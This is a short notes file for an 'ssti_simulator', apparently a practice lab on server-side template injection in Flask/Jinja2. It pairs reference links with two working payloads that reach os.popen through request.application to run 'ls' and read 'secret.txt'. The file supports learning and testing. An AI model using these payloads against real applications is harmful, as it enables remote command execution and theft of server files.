# ssti_simulator helpful links and example payload

## Remote Code Execution through SSTI `request.application`
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}

{{ request.application.__globals__.__builtins__.__import__('os').popen('cat secret.txt').read() }}  

## SSTI Cheat Sheet
https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti

## Python MRO explained
https://www.educative.io/edpresso/what-is-mro-in-python

## Python Flask Documentation
https://flask.palletsprojects.com/en/1.1.x/quickstart/

## Jinja2 Documentaion
https://jinja.palletsprojects.com/en/3.0.x/
